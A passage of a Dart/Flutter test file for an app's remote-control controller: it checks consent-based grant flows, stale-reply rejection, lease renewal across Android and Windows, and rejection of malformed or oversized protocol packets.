import 'dart:async';
import 'dart:convert';
import 'dart:math';

import 'package:crypto/crypto.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:sybl/state/remote_control.dart';
import 'package:sybl/core/jami.dart';

const _call = 'call-1';
const _peer = '0123456789abcdef0123456789abcdef01234567';
const _device = 'abcdef0123456789abcdef0123456789abcdef01';
const _token = '00112233445566778899aabbccddeeff';
const _zeroHash =
    '0000000000000000000000000000000000000000000000000000000000000000';

class _FakeTransport implements RemoteControlTransport {
  bool hostAuthorityEnabled = false;
  @override
  bool get nativeHostAuthority => hostAuthorityEnabled;
  RemoteControlHostAuthority authority = const RemoteControlHostAuthority(
    channelEpoch: 1,
    surfaceRevision: 0,
    hostGeneration: 0,
    revokedThrough: 0,
    blocked: true,
    releaseComplete: true,
    state: 'inactive',
  );
  Completer<RemoteControlHostAuthority?>? blockedSurface;
  final List<Map<String, Object>> surfaces = [];
  bool failSurface = false;
  @override
  Future<RemoteControlHostAuthority?> hostAuthority() async => authority;
  @override
  Future<RemoteControlHostAuthority?> setProtectedSurface({
    required int channelEpoch,
    required int surfaceRevision,
    required bool blocked,
  }) async {
    surfaces.add({
      'channelEpoch': channelEpoch,
      'surfaceRevision': surfaceRevision,
      'blocked': blocked,
    });
    if (blockedSurface != null) return blockedSurface!.future;
    if (failSurface) return null;
    authority = RemoteControlHostAuthority(
      channelEpoch: channelEpoch,
      surfaceRevision: surfaceRevision,
      hostGeneration: authority.hostGeneration,
      revokedThrough: max(authority.revokedThrough, authority.hostGeneration),
      blocked: blocked,
      releaseComplete: true,
      state: 'inactive',
    );
    return authority;
  }

  final List<String> operations = [];
  final List<List<RemoteInputEvent>> inputBatches = [];
  final List<String> androidPackets = [];
  final List<RemoteControlBinding> clipboardBindings = [];
  final List<RemoteClipboardOwner> clipboardOwners = [];
  Completer<bool>? blockedInput;
  Completer<bool>? blockedHostAllow;
  Completer<bool>? blockedHostStop;
  bool result = true;
  bool nativeAuthority = false;
  bool nativeClipboard = false;
  final Set<String> throwingOperations = {};

  @override
  bool get nativeControllerAuthority => nativeAuthority;

  @override
  bool get nativeClipboardCorrelation => nativeClipboard;

  @override
  Future<bool> request(
    RemoteControlBinding binding,
    Set<RemoteControlCapability> capabilities,
    String identityColor,
    String androidPacket,
  ) async {
    operations.add('request:${binding.callId}:${binding.sourceRevision}');
    androidPackets.add(androidPacket);
    return result;
  }

  @override
  Future<bool> input(
    RemoteControlBinding binding,
    List<RemoteInputEvent> events,
    String androidPacket,
  ) {
    operations.add('input:${binding.callId}:${binding.sourceRevision}');
    inputBatches.add(events);
    androidPackets.add(androidPacket);
    return blockedInput?.future ?? Future.value(result);
  }

  @override
  Future<bool> end(RemoteControlBinding binding, String androidPacket) async {
    operations.add('end:${binding.callId}:${binding.sourceRevision}');
    androidPackets.add(androidPacket);
    if (throwingOperations.contains('end')) {
      throw StateError('end failed');
    }
    return result;
  }

  @override
  Future<bool> sendClipboard({
    required RemoteControlBinding binding,
    required String text,
    required String id,
    required String sha256Hex,
    required String androidOfferPacket,
    required String androidDataPacket,
    required bool fromHost,
    required RemoteClipboardOwner owner,
  }) async {
    operations.add('clipboard:${fromHost ? 'host' : 'controller'}:$id');
    clipboardBindings.add(binding);
    clipboardOwners.add(owner);
    androidPackets
      ..add(androidOfferPacket)
      ..add(androidDataPacket);
    return result;
  }

  @override
  Future<bool> respondToClipboard({
    required RemoteControlBinding binding,
    required int promptGeneration,
    required String id,
    required bool accepted,
    required String androidPacket,
    required bool asController,
  }) async {
    operations.add(
      'clipboard-response:${asController ? 'controller' : 'host'}:'
      '${accepted ? 'accept' : 'reject'}:$id',
    );
    androidPackets.add(androidPacket);
    return result;
  }

  @override
  Future<bool> allowHostRequest(
    RemoteControlHostRequest request, {
    required bool persistDevice,
  }) async {
    operations.add(persistDevice ? 'allow-device' : 'allow-once');
    return blockedHostAllow?.future ?? result;
  }

  @override
  Future<bool> denyHostRequest(RemoteControlHostRequest request) async {
    operations.add('deny-host');
    if (throwingOperations.contains('deny-host')) {
      throw StateError('deny host failed');
    }
    return result;
  }

  @override
  Future<bool> stopHostControl() async {
    operations.add('stop-host');
    if (throwingOperations.contains('stop-host')) {
      throw StateError('stop host failed');
    }
    return blockedHostStop?.future ?? result;
  }

  @override
  Future<bool> setCoControl(bool enabled) async {
    operations.add('co-control:$enabled');
    return result;
  }
}

void _sync(
  RemoteControlController controller, {
  int peerRevision = 4,
  int localRevision = 9,
  bool peerScreen = true,
  bool localScreen = false,
  bool live = true,
  bool foreground = true,
  String callId = _call,
}) {
  controller.syncCall(
    live: live,
    foreground: foreground,
    callId: callId,
    peerId: _peer,
    peerScreenActive: peerScreen,
    peerSourceRevision: peerScreen ? peerRevision : null,
    localScreenActive: localScreen,
    localSourceRevision: localRevision,
  );
}

Future<void> _activateAndroid(
  RemoteControlController controller, {
  int revision = 4,
}) async {
  _sync(controller, peerRevision: revision);
  expect(await controller.requestControl(), isTrue);
  controller.applyControlleePacket(
    callId: _call,
    peerId: _peer,
    peerDeviceId: _device,
    payload:
        '{"caps":["mouse","keyboard","text","clipboard"],'
        '"epoch":7,"sourceRevision":$revision,"t":"grant",'
        '"token":"$_token","v":1}',
  );
  expect(controller.phase, RemoteControlPhase.controlling);
}

Future<void> _activateNative(
  RemoteControlController controller, {
  int revision = 4,
}) async {
  _sync(controller, peerRevision: revision);
  expect(await controller.requestControl(), isTrue);
  controller.applyNativeControllerState({
    'callId': _call,
    'peerJamiId': _peer,
    'peerDeviceId': _device,
    'sourceRevision': revision,
    'controlCapabilities': 15,
    'state': 'active',
  });
  expect(controller.phase, RemoteControlPhase.controlling);
}

Map<String, dynamic> _nativeHostEvent(
  _FakeTransport transport, {
  String state = 'active',
  int generation = 7,
}) => {
  'channelEpoch': transport.authority.channelEpoch,
  'surfaceRevision': transport.authority.surfaceRevision,
  'callId': _call,
  'controllerAccountId': _peer,
  'controllerDeviceId': _device,
  'sourceRevision': 9,
  'hostGeneration': generation,
  'state': state,
  'controlCapabilities': 15,
  'persistentAvailable': true,
};

Map<String, dynamic> _authorityEvent(RemoteControlHostAuthority value) => {
  'channelEpoch': value.channelEpoch,
  'surfaceRevision': value.surfaceRevision,
  'hostGeneration': value.hostGeneration,
  'revokedThrough': value.revokedThrough,
  'blocked': value.blocked,
  'releaseComplete': value.releaseComplete,
  'state': value.state,
};

RemoteControlHostAuthority _surfaceReply(
  _FakeTransport transport, {
  bool blocked = true,
  bool released = true,
}) => RemoteControlHostAuthority(
  channelEpoch: transport.surfaces.last['channelEpoch']! as int,
  surfaceRevision: transport.surfaces.last['surfaceRevision']! as int,
  hostGeneration: 7,
  revokedThrough: 7,
  blocked: blocked,
  releaseComplete: released,
  state: released ? 'inactive' : 'revoking',
);

Future<void> _establishNativeHost(
  RemoteControlController controller,
  _FakeTransport transport,
) async {
  _sync(controller, peerScreen: false, localScreen: true);
  await pumpEventQueue();
  controller.applyNativeHostState(_nativeHostEvent(transport));
  expect(controller.hostActive, isTrue);
}

void main() {
  test(
    'a pending settings write cannot capture an uncommitted pointer color',
    () async {
      final transport = _FakeTransport();
      var allowed = false;
      final controller = RemoteControlController(
        transport,
        requestAllowed: () => allowed,
      );
      addTearDown(controller.dispose);
      _sync(controller);
      expect(controller.canRequest, isFalse);
      expect(await controller.requestControl(), isFalse);
      expect(transport.operations, isEmpty);
      allowed = true;
      expect(controller.canRequest, isTrue);
      expect(await controller.requestControl(), isTrue);
      expect(
        transport.operations.where(
          (operation) => operation.startsWith('request:'),
        ),
        hasLength(1),
      );
    },
  );

  testWidgets('text is generated lazily and retired with its original grant', (
    tester,
  ) async {
    final transport = _FakeTransport();
    final controller = RemoteControlController(transport);
    await _activateAndroid(controller);
    controller.text('😀' * 48);
    await tester.pump();
    List<RemoteTextEvent> sentText() => transport.inputBatches
        .expand((batch) => batch)
        .whereType<RemoteTextEvent>()
        .toList();
    expect(sentText(), hasLength(1));
    expect(sentText().single.text.length, 32);
    await tester.pump(const Duration(milliseconds: 500));
    expect(sentText(), hasLength(2));
    await controller.stopControlling();
    await tester.pump(const Duration(seconds: 2));
    expect(sentText(), hasLength(2));
    controller.dispose();
  });

  for (final allowNext in [true, false]) {
    test(
      'acknowledged stop releases a lost Allow decision for ${allowNext ? 'Allow' : 'Deny'}',
      () async {
        final transport = _FakeTransport()..hostAuthorityEnabled = true;
        final controller = RemoteControlController(transport);
        addTearDown(controller.dispose);
        _sync(controller, peerScreen: false, localScreen: true);
        await pumpEventQueue();
        controller.applyNativeHostRequest(_nativeHostEvent(transport));
        final oldReply = Completer<bool>();
        transport.blockedHostAllow = oldReply;
        final oldAllow = controller.allowHost(
          expectedRequest: controller.hostRequest!,
          persistDevice: false,
        );
        expect(await controller.stopHost(), isTrue);
        await pumpEventQueue();
        transport.blockedHostAllow = null;
        controller.applyNativeHostRequest(
          _nativeHostEvent(transport, generation: 8),
        );
        final next = controller.hostRequest!;
        expect(
          await (allowNext
              ? controller.allowHost(
                  expectedRequest: next,
                  persistDevice: false,
                )
              : controller.denyHost(next)),
          isTrue,
        );
        final phase = controller.hostPhase;
        oldReply.complete(true);
        expect(await oldAllow, isFalse);
        expect(controller.hostPhase, phase);
        expect(controller.hostRequest, allowNext ? same(next) : isNull);
      },
    );
  }

  test(
    'old Allow completion cannot release a same-generation decision in a new epoch',
    () async {
      final transport = _FakeTransport()..hostAuthorityEnabled = true;
      final controller = RemoteControlController(transport);
      addTearDown(controller.dispose);
      _sync(controller, peerScreen: false, localScreen: true);
      await pumpEventQueue();
      controller.applyNativeHostRequest(_nativeHostEvent(transport));
      final oldReply = Completer<bool>();
      transport.blockedHostAllow = oldReply;
      final oldAllow = controller.allowHost(
        expectedRequest: controller.hostRequest!,
        persistDevice: false,
      );
      controller.applyNativeHostAuthority({
        ..._authorityEvent(transport.authority),
        'channelEpoch': 2,
        'surfaceRevision': 0,
        'blocked': true,
      });
      await pumpEventQueue();
      controller.applyNativeHostRequest(_nativeHostEvent(transport));
      final next = controller.hostRequest!;
      final newReply = Completer<bool>();
      transport.blockedHostAllow = newReply;
      final newAllow = controller.allowHost(
        expectedRequest: next,
        persistDevice: false,
      );
      expect(
        transport.operations.where((v) => v == 'allow-once'),
        hasLength(2),
      );
      oldReply.complete(true);
      expect(await oldAllow, isFalse);
      expect(await controller.denyHost(next), isFalse);
      newReply.complete(true);
      expect(await newAllow, isTrue);
    },
  );

  testWidgets(
    'new epoch renews while an old same-revision renewal is pending',
    (tester) async {
      final transport = _FakeTransport()..hostAuthorityEnabled = true;
      final controller = RemoteControlController(transport);
      addTearDown(controller.dispose);
      _sync(controller, peerScreen: false, localScreen: true);
      await tester.pump();
      final oldAuthority = transport.authority;
      final oldReply = Completer<RemoteControlHostAuthority?>();
      transport.blockedSurface = oldReply;
      await tester.pump(const Duration(milliseconds: 500));
      transport.blockedSurface = null;
      controller.applyNativeHostAuthority({
        ..._authorityEvent(oldAuthority),
        'channelEpoch': 2,
        'surfaceRevision': 0,
        'blocked': true,
      });
      await tester.pump();
      final nextAuthority = transport.authority;
      final beforeRenew = transport.surfaces.length;
      final newReply = Completer<RemoteControlHostAuthority?>();
      transport.blockedSurface = newReply;
      await tester.pump(const Duration(milliseconds: 500));
      expect(transport.surfaces, hasLength(beforeRenew + 1));
      expect(transport.surfaces.last['channelEpoch'], 2);
      expect(transport.surfaces.last['surfaceRevision'], 1);
      oldReply.complete(oldAuthority);
      await tester.pump();
      await tester.pump(const Duration(milliseconds: 500));
      expect(transport.surfaces, hasLength(beforeRenew + 1));
      transport.blockedSurface = null;
      newReply.complete(nextAuthority);
      await tester.pump();
      await tester.pump(const Duration(milliseconds: 500));
      expect(transport.surfaces, hasLength(beforeRenew + 2));
      controller.dispose();
    },
  );

  test(
    'stop rejects an acknowledgement with a regressed retirement boundary',
    () async {
      final transport = _FakeTransport()..hostAuthorityEnabled = true;
      final controller = RemoteControlController(transport);
      addTearDown(controller.dispose);
      await _establishNativeHost(controller, transport);
      controller.applyNativeHostAuthority({
        ..._authorityEvent(transport.authority),
        'hostGeneration': 7,
        'revokedThrough': 6,
        'state': 'active',
      });
      final delayed = Completer<RemoteControlHostAuthority?>();
      transport.blockedSurface = delayed;
      final stop = controller.stopHost();
      delayed.complete(
        RemoteControlHostAuthority(
          channelEpoch: transport.surfaces.last['channelEpoch']! as int,
          surfaceRevision: transport.surfaces.last['surfaceRevision']! as int,
          hostGeneration: 0,
          revokedThrough: 5,
          blocked: true,
          releaseComplete: true,
          state: 'inactive',
        ),
      );
      expect(await stop, isFalse);
      expect(controller.hostPhase, RemoteControlHostPhase.revoking);
      expect(transport.surfaces.last['blocked'], isTrue);
    },
  );

  test(
    'native inactive acknowledgement retires a host when its ended event is lost',
    () async {
      final transport = _FakeTransport()..hostAuthorityEnabled = true;
      final controller = RemoteControlController(transport);
      addTearDown(controller.dispose);
      await _establishNativeHost(controller, transport);
      controller.applyNativeHostAuthority({
        ..._authorityEvent(transport.authority),
        'hostGeneration': 0,
        'revokedThrough': 7,
        'state': 'inactive',
      });
      expect(controller.hostPhase, RemoteControlHostPhase.idle);
      controller.applyNativeHostState(
        _nativeHostEvent(transport, generation: 8),
      );
      expect(controller.hostActive, isTrue);
    },
  );

  test('new block invalidates an outstanding unblock reply', () async {
    final transport = _FakeTransport()..hostAuthorityEnabled = true;
    final controller = RemoteControlController(transport);
    addTearDown(controller.dispose);
    await controller.initializeHostAuthority();
    final open = Completer<RemoteControlHostAuthority?>();
    transport.blockedSurface = open;
    _sync(controller, peerScreen: false, localScreen: true);
    await pumpEventQueue();
    final staleReply = _surfaceReply(transport, blocked: false);
    transport.blockedSurface = null;
    _sync(controller, peerScreen: false, localScreen: false);
    await pumpEventQueue();
    final blockedRevision = transport.authority.surfaceRevision;
    open.complete(staleReply);
    await pumpEventQueue();
    expect(transport.surfaces.last['blocked'], isTrue);
    expect(transport.authority.surfaceRevision, blockedRevision);
    controller.applyNativeHostState({
      ..._nativeHostEvent(transport),
      'surfaceRevision': staleReply.surfaceRevision,
    });
    expect(controller.hostActive, isFalse);
  });

  test(
    'failed block cannot reopen when a later native lease-expiry ack arrives',
    () async {
      final transport = _FakeTransport()..hostAuthorityEnabled = true;
      final controller = RemoteControlController(transport);
      addTearDown(controller.dispose);
      await _establishNativeHost(controller, transport);
      transport.failSurface = true;
      expect(await controller.stopHost(), isFalse);
      final count = transport.surfaces.length;
      controller.applyNativeHostAuthority(
        _authorityEvent(_surfaceReply(transport)),
      );
      await pumpEventQueue();
      expect(controller.hostPhase, RemoteControlHostPhase.idle);
      expect(transport.surfaces, hasLength(count));
      controller.applyNativeHostState(
        _nativeHostEvent(transport, generation: 8),
      );
      expect(controller.hostActive, isFalse);
    },
  );

  testWidgets('Windows lease renews only the current acknowledged surface', (
    tester,
  ) async {
    final transport = _FakeTransport()..hostAuthorityEnabled = true;
    final controller = RemoteControlController(transport);
    addTearDown(controller.dispose);
    _sync(controller, peerScreen: false, localScreen: true);
    await tester.pump();
    final opened = Map<String, Object>.of(transport.surfaces.last);
    await tester.pump(const Duration(milliseconds: 500));
    expect(transport.surfaces.last, opened);
    expect(transport.surfaces, hasLength(2));
    final delayed = Completer<RemoteControlHostAuthority?>();
    transport.blockedSurface = delayed;
    final stop = controller.stopHost();
    final blocked = Map<String, Object>.of(transport.surfaces.last);
    await tester.pump(const Duration(seconds: 2));
    expect(transport.surfaces.last, blocked);
    expect(controller.hostPhase, RemoteControlHostPhase.revoking);
    delayed.complete(null);
    expect(await stop, isFalse);
    controller.dispose();
  });

  testWidgets('lost lease renewal stops renewal and keeps the host uncertain', (
    tester,
  ) async {
    final transport = _FakeTransport()..hostAuthorityEnabled = true;
    final controller = RemoteControlController(transport);
    addTearDown(controller.dispose);
    _sync(controller, peerScreen: false, localScreen: true);
    await tester.pump();
    controller.applyNativeHostState(_nativeHostEvent(transport));
    final delayed = Completer<RemoteControlHostAuthority?>();
    transport.blockedSurface = delayed;
    await tester.pump(const Duration(milliseconds: 500));
    await tester.pump(const Duration(seconds: 2));
    expect(controller.hostActive, isFalse);
    expect(controller.hostPhase, RemoteControlHostPhase.revoking);
    expect(transport.surfaces.last['blocked'], isTrue);
    final count = transport.surfaces.length;
    await tester.pump(const Duration(seconds: 2));
    expect(transport.surfaces, hasLength(count));
    delayed.complete(null);
    await tester.pump();
    controller.dispose();
  });

  test('native lease expiry needs a fresh source handshake', () async {
    final transport = _FakeTransport()..hostAuthorityEnabled = true;
    final controller = RemoteControlController(transport);
    addTearDown(controller.dispose);
    await _establishNativeHost(controller, transport);
    final old = _nativeHostEvent(transport);
    transport.authority = RemoteControlHostAuthority(
      channelEpoch: 1,
      surfaceRevision: transport.authority.surfaceRevision + 1,
      hostGeneration: 0,
      revokedThrough: 7,
      blocked: true,
      releaseComplete: true,
      state: 'inactive',
    );
    final count = transport.surfaces.length;
    controller.applyNativeHostAuthority(_authorityEvent(transport.authority));
    await pumpEventQueue();
    expect(controller.hostActive, isFalse);
    expect(transport.surfaces, hasLength(count));
    controller.applyNativeHostState(old);
    expect(controller.hostActive, isFalse);
    _sync(controller, peerScreen: false, localScreen: true, localRevision: 10);
    await pumpEventQueue();
    expect(transport.surfaces.skip(count).map((v) => v['blocked']), [
      true,
      false,
    ]);
    controller.applyNativeHostState({
      ..._nativeHostEvent(transport, generation: 8),
      'sourceRevision': 10,
    });
    expect(controller.hostActive, isTrue);
  });

  test(
    'Windows acknowledged stop blocks first and rejects delayed activation',
    () async {
      final transport = _FakeTransport()..hostAuthorityEnabled = true;
      final controller = RemoteControlController(transport);
      addTearDown(controller.dispose);
      await _establishNativeHost(controller, transport);
      final old = _nativeHostEvent(transport);
      final ack = Completer<RemoteControlHostAuthority?>();
      transport.blockedSurface = ack;
      final stop = controller.stopHost();
      final duplicate = controller.stopHost();
      expect(controller.hostPhase, RemoteControlHostPhase.revoking);
      expect(
        transport.surfaces.where((s) => s['blocked'] == true),
        hasLength(1),
      );
      controller.applyNativeHostState(old);
      expect(controller.hostActive, isFalse);
      transport.blockedSurface = null;
      transport.authority = _surfaceReply(transport);
      ack.complete(transport.authority);
      expect(await stop, isTrue);
      expect(await duplicate, isTrue);
      await pumpEventQueue();
      expect(controller.hostPhase, RemoteControlHostPhase.idle);
      controller.applyNativeHostState({
        ...old,
        'surfaceRevision': transport.authority.surfaceRevision,
      });
      expect(controller.hostActive, isFalse);
      controller.applyNativeHostState(
        _nativeHostEvent(transport, generation: 8),
      );
      expect(controller.hostActive, isTrue);
    },
  );

  for (final fail in ['null', 'throw', 'release-pending', 'wrong-revision']) {
    test(
      'Windows stop $fail keeps authority uncertain and rejects old replies',
      () async {
        final transport = _FakeTransport()..hostAuthorityEnabled = true;
        final controller = RemoteControlController(transport);
        addTearDown(controller.dispose);
        await _establishNativeHost(controller, transport);
        final old = _authorityEvent(transport.authority);
        final ack = Completer<RemoteControlHostAuthority?>();
        transport.blockedSurface = ack;
        final stop = controller.stopHost();
        switch (fail) {
          case 'null':
            ack.complete(null);
          case 'throw':
            ack.completeError(StateError('channel failed'));
          case 'release-pending':
            ack.complete(_surfaceReply(transport, released: false));
          case 'wrong-revision':
            ack.complete(transport.authority);
        }
        expect(await stop, isFalse);
        expect(controller.hostPhase, RemoteControlHostPhase.revoking);
        controller.applyNativeHostAuthority(old);
        expect(controller.hostPhase, RemoteControlHostPhase.revoking);
        expect(transport.surfaces.last['blocked'], isTrue);
        controller.applyNativeHostState(
          _nativeHostEvent(transport, generation: 9),
        );
        expect(controller.hostActive, isFalse);
        transport.blockedSurface = null;
      },
    );
  }

  test(
    'Windows stop invalidates a pending Allow and its late success',
    () async {
      final transport = _FakeTransport()..hostAuthorityEnabled = true;
      final controller = RemoteControlController(transport);
      addTearDown(controller.dispose);
      _sync(controller, peerScreen: false, localScreen: true);
      await pumpEventQueue();
      controller.applyNativeHostRequest(_nativeHostEvent(transport));
      final allow = Completer<bool>();
      transport.blockedHostAllow = allow;
      final result = controller.allowHost(
        expectedRequest: controller.hostRequest!,
        persistDevice: false,
      );
      expect(controller.hostPhase, RemoteControlHostPhase.prompting);
      expect(await controller.stopHost(), isTrue);
      allow.complete(true);
      expect(await result, isFalse);
      controller.applyNativeHostState(_nativeHostEvent(transport));
      expect(controller.hostActive, isFalse);
    },
  );

  test(
    'Windows Allow success waits for the current native lifecycle event',
    () async {
      final transport = _FakeTransport()..hostAuthorityEnabled = true;
      final controller = RemoteControlController(transport);
      addTearDown(controller.dispose);
      _sync(controller, peerScreen: false, localScreen: true);
      await pumpEventQueue();
      controller.applyNativeHostRequest(_nativeHostEvent(transport));
      expect(
        await controller.allowHost(
          expectedRequest: controller.hostRequest!,
          persistDevice: false,
        ),
        isTrue,
      );
      expect(controller.hostPhase, RemoteControlHostPhase.prompting);
      controller.applyNativeHostState(_nativeHostEvent(transport));
      expect(controller.hostActive, isTrue);
    },
  );

  test(
    'new native channel epoch rejects old events and old unblock replies',
    () async {
      final transport = _FakeTransport()..hostAuthorityEnabled = true;
      final controller = RemoteControlController(transport);
      addTearDown(controller.dispose);
      await _establishNativeHost(controller, transport);
      final old = _nativeHostEvent(transport);
      controller.hostChannelFailed();
      await pumpEventQueue();
      expect(transport.surfaces.last['blocked'], isTrue);
      controller.applyNativeHostState(old);
      expect(controller.hostActive, isFalse);
      controller.applyNativeHostAuthority({
        'channelEpoch': 2,
        'surfaceRevision': 0,
        'hostGeneration': 0,
        'revokedThrough': 0,
        'blocked': true,
        'releaseComplete': true,
        'state': 'inactive',
      });
      await pumpEventQueue();
      controller.applyNativeHostState(old);
      expect(controller.hostActive, isFalse);
      controller.applyNativeHostState(
        _nativeHostEvent(transport, generation: 1),
      );
      expect(controller.hostActive, isTrue);
    },
  );

  test('host stop does not claim idle before native acknowledgement', () async {
    final stop = Completer<bool>();
    final transport = _FakeTransport()..blockedHostStop = stop;
    final controller = RemoteControlController(transport);
    addTearDown(controller.dispose);
    _sync(controller, peerScreen: false, localScreen: true);
    controller.applyNativeHostState({
      'callId': _call,
      'controllerAccountId': _peer,
      'controllerDeviceId': _device,
      'sourceRevision': 9,
      'hostGeneration': 7,
      'state': 'active',
    });
    final stopping = controller.stopHost();
    expect(controller.hostPhase, isNot(RemoteControlHostPhase.idle));
    stop.complete(false);
    expect(await stopping, isFalse);
    expect(controller.hostPhase, isNot(RemoteControlHostPhase.idle));
  });

  test('retired native host generation cannot reactivate after stop', () async {
    final controller = RemoteControlController(_FakeTransport());
    addTearDown(controller.dispose);
    _sync(controller, peerScreen: false, localScreen: true);
    final active = {
      'callId': _call,
      'controllerAccountId': _peer,
      'controllerDeviceId': _device,
      'sourceRevision': 9,
      'hostGeneration': 7,
      'state': 'active',
    };
    controller.applyNativeHostState(active);
    expect(controller.hostActive, isTrue);
    expect(await controller.stopHost(), isTrue);
    controller.applyNativeHostState(active);
    expect(controller.hostActive, isFalse);
  });

  test(
    'unsupported control denial explains that peer setup is not ready',
    () async {
      final androidTransport = _FakeTransport();
      final android = RemoteControlController(androidTransport);
      addTearDown(android.dispose);
      _sync(android);
      expect(await android.requestControl(), isTrue);
      android.applyControlleePacket(
        callId: _call,
        peerId: _peer,
        peerDeviceId: _device,
        payload: '{"reason":"unsupported","t":"deny","v":1}',
      );
      expect(android.notice, 'Remote control is not ready on their device.');

      final windowsTransport = _FakeTransport()..nativeAuthority = true;
      final windows = RemoteControlController(windowsTransport);
      addTearDown(windows.dispose);
      _sync(windows);
      expect(await windows.requestControl(), isTrue);
      windows.applyNativeControllerState({
        'callId': _call,
        'peerJamiId': _peer,
        'peerDeviceId': _device,
        'sourceRevision': 4,
        'state': 'denied',
        'reason': 'unsupported',
      });
      expect(windows.notice, 'Remote control is not ready on their device.');
    },
  );

  test(
    'native request timeout clears asking state without a peer device',
    () async {
      final transport = _FakeTransport()..nativeAuthority = true;
      final controller = RemoteControlController(transport);
      addTearDown(controller.dispose);
      _sync(controller);

      expect(await controller.requestControl(), isTrue);
      controller.applyNativeControllerState({
        'callId': _call,
        'peerJamiId': _peer,
        'peerDeviceId': '',
        'sourceRevision': 4,
        'state': 'denied',
        'reason': 'timeout',
      });

      expect(controller.phase, RemoteControlPhase.denied);
      expect(controller.notice, 'Control request timed out.');
      expect(controller.canRequest, isTrue);
      expect(await controller.requestControl(), isTrue);
    },
  );

  testWidgets(
    'all four Android/Windows controller-controllee pairs activate only '
    'through the receiver grant',
    (tester) async {
      final combinations =
          <
            ({
              String controller,
              String controllee,
              bool nativeController,
              int nativeCapabilities,
              String wireCapabilities,
              Set<RemoteControlCapability> expected,
            })
          >[
            (
              controller: 'Android',
              controllee: 'Android',
              nativeController: false,
              nativeCapabilities: 117,
              wireCapabilities: '"mouse","text","back","home","recents"',
              expected: const {
                RemoteControlCapability.mouse,
                RemoteControlCapability.text,
                RemoteControlCapability.back,
                RemoteControlCapability.home,
                RemoteControlCapability.recents,
              },
            ),
            (
              controller: 'Android',
              controllee: 'Windows',
              nativeController: false,
              nativeCapabilities: 15,
              wireCapabilities: '"mouse","keyboard","text","clipboard"',
              expected: const {
                RemoteControlCapability.mouse,
                RemoteControlCapability.keyboard,
                RemoteControlCapability.text,
                RemoteControlCapability.clipboard,
              },
            ),
            (
              controller: 'Windows',
              controllee: 'Android',
              nativeController: true,
              nativeCapabilities: 117,
              wireCapabilities: '"mouse","text","back","home","recents"',
              expected: const {
                RemoteControlCapability.mouse,
                RemoteControlCapability.text,
                RemoteControlCapability.back,
                RemoteControlCapability.home,
                RemoteControlCapability.recents,
              },
            ),
            (
              controller: 'Windows',
              controllee: 'Windows',
              nativeController: true,
              nativeCapabilities: 15,
              wireCapabilities: '"mouse","keyboard","text","clipboard"',
              expected: const {
                RemoteControlCapability.mouse,
                RemoteControlCapability.keyboard,
                RemoteControlCapability.text,
                RemoteControlCapability.clipboard,
              },
            ),
          ];

      for (final combination in combinations) {
        final transport = _FakeTransport()
          ..nativeAuthority = combination.nativeController;
        final controller = RemoteControlController(transport);
        _sync(controller);

        expect(
          await controller.requestControl(),
          isTrue,
          reason:
              '${combination.controller} -> ${combination.controllee} request',
        );
        expect(
          controller.phase,
          RemoteControlPhase.requesting,
          reason:
              '${combination.controller} -> ${combination.controllee} cannot '
              'self-grant',
        );

        if (combination.nativeController) {
          controller.applyNativeControllerState({
            'callId': _call,
            'peerJamiId': _peer,
            'peerDeviceId': _device,
            'sourceRevision': 4,
            'controlCapabilities': combination.nativeCapabilities,
            'state': 'active',
          });
        } else {
          controller.applyControlleePacket(
            callId: _call,
            peerId: _peer,
            peerDeviceId: _device,
            payload:
                '{"caps":[${combination.wireCapabilities}],'
                '"epoch":7,"sourceRevision":4,"t":"grant",'
                '"token":"$_token","v":1}',
          );
        }

        expect(
          controller.phase,
          RemoteControlPhase.controlling,
          reason: '${combination.controller} -> ${combination.controllee}',
        );
        expect(
          controller.grantedCapabilities,
          combination.expected,
          reason: '${combination.controller} -> ${combination.controllee}',
        );
        controller.dispose();
      }
    },
  );

  group('RemoteControlProtocol interop', () {
    String inputPacket(String events) =>
        '{"v":1,"t":"input","token":"$_token","epoch":7,"seq":9,'
        '"sourceRevision":4,"ev":[$events]}';

    test('rejects comments outside strings and preserves literal slashes', () {
      final comments = <String>[
        '{/*member*/"v":1,"t":"end"}',
        '{"v":1,/*member*/"t":"end"}',
        '{"v":1,"t":/*value*/"end"}',
        '{"v":1,"t":"end"/*tail*/}',
        '{"v":1,//member\n"t":"end"}',
        '{"v":1,"t":"req","caps":[/*item*/"mouse"],'
            '"color":"amber","sourceRevision":4}',
      ];
      for (final packet in comments) {
        expect(
          RemoteControlProtocol.parse(
            packet,
            RemoteControlWireDirection.controllerToControllee,
          ),
          isNull,
          reason: packet,
        );
      }
      final parsed = RemoteControlProtocol.parse(
        inputPacket(
          r'["t","http://peer/a /* text */ // text"],'
          r'["t","quote: \" // text"],'
          r'["t","slash: \\ // text"],'
          r'["t","escaped slash: \/"]',
        ),
        RemoteControlWireDirection.controllerToControllee,
      );
      expect(parsed, isNotNull);
      expect(
        (parsed!.fields['events'] as List<RemoteInputEvent>)
            .cast<RemoteTextEvent>()
            .map((event) => event.text),
        [
          'http://peer/a /* text */ // text',
          'quote: " // text',
          r'slash: \ // text',
          'escaped slash: /',
        ],
      );
    });

    test('accepts exactly 6000 bytes and rejects serializer overflow', () {
      expect(RemoteControlProtocol.maxPacketBytes, 6000);
      final events = <RemoteInputEvent>[
        for (var i = 0; i < 22; i++) RemoteTextEvent('x' * 256),
        const RemoteTextEvent('x'),
      ];
      String encode() => RemoteControlProtocol.input(
        token: _token,
        epoch: 7,
        sequence: 9,
        sourceRevision: 4,
        events: events,
      );
      final initialBytes = utf8.encode(encode()).length;
      expect(initialBytes, lessThan(6000));
      final finalTextBytes = 1 + 6000 - initialBytes;
      expect(finalTextBytes, lessThan(256));
      events[events.length - 1] = RemoteTextEvent('x' * finalTextBytes);
      final exact = encode();
      expect(utf8.encode(exact), hasLength(6000));
      expect(
        RemoteControlProtocol.parse(
          exact,
          RemoteControlWireDirection.controllerToControllee,
        )?.type,
        RemoteControlWireType.input,
      );
      events[events.length - 1] = RemoteTextEvent('x' * (finalTextBytes + 1));
      expect(encode, throwsArgumentError);

      final multibyte = inputPacket('["t","é"]');
      final padded =
          '$multibyte${' ' * (6000 - utf8.encode(multibyte).length)}';
      expect(utf8.encode(padded), hasLength(6000));
      expect(
        RemoteControlProtocol.parse(
          padded,
          RemoteControlWireDirection.controllerToControllee,
        ),
        isNotNull,
      );
      expect(
        RemoteControlProtocol.parse(
          '$padded ',
          RemoteControlWireDirection.controllerToControllee,
        ),
        isNull,
      );
    });

    test('rejects malformed JSON grammar and nonfinite coordinates', () {
      final invalid = <String>[
        '',
        '{"v":1,"t":"end",}',
